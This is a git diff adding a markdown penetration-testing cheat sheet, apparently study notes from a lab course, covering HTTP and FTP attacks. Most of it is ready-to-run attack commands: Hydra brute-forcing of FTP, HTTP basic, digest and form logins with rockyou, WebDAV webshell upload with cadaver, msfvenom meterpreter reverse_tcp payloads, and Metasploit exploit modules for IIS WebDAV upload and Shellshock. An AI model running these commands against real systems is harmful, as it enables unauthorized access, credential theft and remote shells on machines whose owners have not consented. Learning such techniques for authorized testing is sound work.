@@ -1,5 +1,128 @@
 #Hydra 
 
 Attacking un Common ports
+gzip -d /usr/share/wordlists/rockyou.txt.gz
 hydra -L /root/Desktop/wordlists/ftp_Users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://192.253.124.3:5554
+
+#HTTP: 80, 443
+
+####Nmap
+```bash
+sudo nmap -p 80 -sV -O <TARGET_IP>
+
+nmap -p 80 --script=http-enum -sV <TARGET_IP>
+nmap -p 80 --script=http-headers -sV <TARGET_IP>
+nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
+nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
+```
+
+####Alternative
+```bash
+whatweb <TARGET_IP>
+http <TARGET_IP>
+browsh --startup-url http://<TARGET_IP>
+
+dirb http://<TARGET_IP>
+dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt
+dirb http://<TARGET_IP> -u bob:password_123321
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/ #brute http basic auth
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/ #brute http digest
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed" # brute http post form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v" #brute http authenticated post form
+
+wget <TARGET_IP>
+curl <TARGET_IP> | more
+curl -I http://<TARGET_IP>/<DIR>
+curl --digest -u <USER>:<PW> http://<TARGET_IP>/<DIR>
+
+lynx <TARGET_IP>
+```
+#### Metasploit
+```bash
+use auxiliary/scanner/http/brute_dirs
+use auxiliary/scanner/http/robots_txt
+use auxiliary/scanner/http/http_header
+use auxiliary/scanner/http/http_login
+use auxiliary/scanner/http/http_version
+
+# Global set
+setg RHOSTS <TARGET_IP>
+setg RHOST <TARGET_IP>
+
+## set options depends on the selected module
+set HTTP_METHOD GET
+set TARGETURI /<DIR>/
+
+set USER_FILE <USERS_LIST>
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set AUTH_URI /<DIR>/
+exploit
+```
+####IIS WEBDAV
+```bash
+# IIS WEBDAV. Shows directory, file creation and execution of it.
+davtest -url <URL>
+davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav
+
+#upload file. Type of files is shown above in davtest tool 
+cadaver [OPTIONS] <URL>
+cadaver http://target1.ine.local/webdav
+dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
+#in the tab: dir C:\
+
+nmap -p 80 --script http-enum -sV <TARGET_IP>
+
+msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f <file_type> > shell.asp
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
+
+hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <TARGET_IP> http-get /webdav/
+```
+```bash
+## METASPLOIT
+# Global set
+setg RHOSTS <TARGET_IP>
+setg RHOST <TARGET_IP>
+
+use exploit/multi/handler
+use exploit/windows/iis/iis_webdav_upload_asp
+
+set payload windows/meterpreter/reverse_tcp
+set LHOST <LOCAL_HOST_IP>
+set LPORT <LOCAL_PORT>
+
+set HttpUsername <USER>
+set HttpPassword <PW>
+set PATH /webdav/metasploit.asp
+```
+
+####ShellShock
+```bash
+# BASH - APACHE
+nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>
+```
+
+```bash
+## METASPLOIT
+# Global set
+setg RHOSTS <TARGET_IP>
+setg RHOST <TARGET_IP>
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS <TARGET_IP>
+set TARGETURI /gettime.cgi
+exploit
+```
+####Bruteforce 
+```bash
+
+```
+
+
+
+
+
+
 
